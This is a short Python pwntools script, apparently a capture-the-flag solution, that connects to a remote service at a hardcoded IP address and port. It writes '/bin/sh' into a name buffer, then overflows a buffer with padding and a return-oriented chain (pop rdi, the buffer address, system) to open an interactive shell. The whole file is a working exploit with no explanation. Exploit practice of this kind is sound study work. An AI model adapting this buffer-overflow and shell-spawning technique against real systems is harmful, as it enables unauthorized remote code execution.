from pwn import *

system = 0x400530
pop_rdi = 0x400773
name = 0x601070
r = remote('140.110.112.77', 2120)
r.recvuntil('name?')
r.sendline('/bin/sh\0')
r.recvuntil(':)')
r.sendline('a' * 0x38 + p64(pop_rdi) + p64(name) + p64(system))
r.interactive()
